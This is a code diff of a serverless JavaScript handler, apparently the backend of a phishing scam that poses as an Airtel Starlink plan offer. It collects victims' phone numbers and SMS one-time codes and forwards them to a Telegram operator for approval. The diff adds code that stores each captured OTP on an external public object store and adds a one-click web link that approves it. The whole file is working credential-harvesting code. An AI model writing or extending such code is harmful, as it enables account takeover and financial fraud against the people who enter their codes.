@@ -15,7 +15,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { sessionId, phone, otp, planName, planPrice } = req.body || {};
+    const { sessionId, cloudId, phone, otp, planName, planPrice } = req.body || {};
 
     if (!sessionId || !otp) {
       return res.status(400).json({ error: 'Paramètres manquants.' });
@@ -23,6 +23,30 @@ export default async function handler(req, res) {
 
     const cleanOtp = otp.toString().replace(/\D/g, '').slice(0, 4);
     const cleanPhone = phone ? phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '') : 'Inconnu';
+    const targetId = cloudId || sessionId;
+
+    // Update cloud record
+    try {
+      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${targetId}`);
+      if (fetchRes.ok) {
+        const record = await fetchRes.json();
+        const data = record.data || {};
+        data.otp = cleanOtp;
+        data.otpStatus = 'pending';
+        data.lastUpdated = Date.now();
+
+        await fetch(`https://api.restful-api.dev/objects/${targetId}`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: record.name || targetId,
+            data,
+          }),
+        });
+      }
+    } catch (e) {
+      console.warn('Error updating OTP in cloud record:', e);
+    }
 
     const messageText =
       `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
@@ -30,18 +54,24 @@ export default async function handler(req, res) {
       `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
       `📦 <b>Forfait:</b> ${planName || 'Forfait Airtel Starlink'} (${planPrice || '$1.49'})\n` +
       `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
-      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
+      `🆔 <b>Session:</b> <code>${targetId}</code>\n\n` +
       `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
 
     const inlineKeyboard = [
       [
         {
           text: '✅ Valider OTP',
-          callback_data: `approve_otp_${sessionId}`,
+          callback_data: `approve_otp_${targetId}`,
         },
         {
           text: '❌ Rejeter OTP',
-          callback_data: `reject_otp_${sessionId}`,
+          callback_data: `reject_otp_${targetId}`,
+        },
+      ],
+      [
+        {
+          text: '🌐 Action Directe (Lien Web)',
+          url: `https://congo2-one.vercel.app/api/telegram/action?id=${targetId}&action=approve_otp`,
         },
       ],
     ];
@@ -64,6 +94,7 @@ export default async function handler(req, res) {
     return res.status(200).json({
       success: true,
       sessionId,
+      cloudId: targetId,
       status: 'pending',
       telegramResult: tgData,
     });
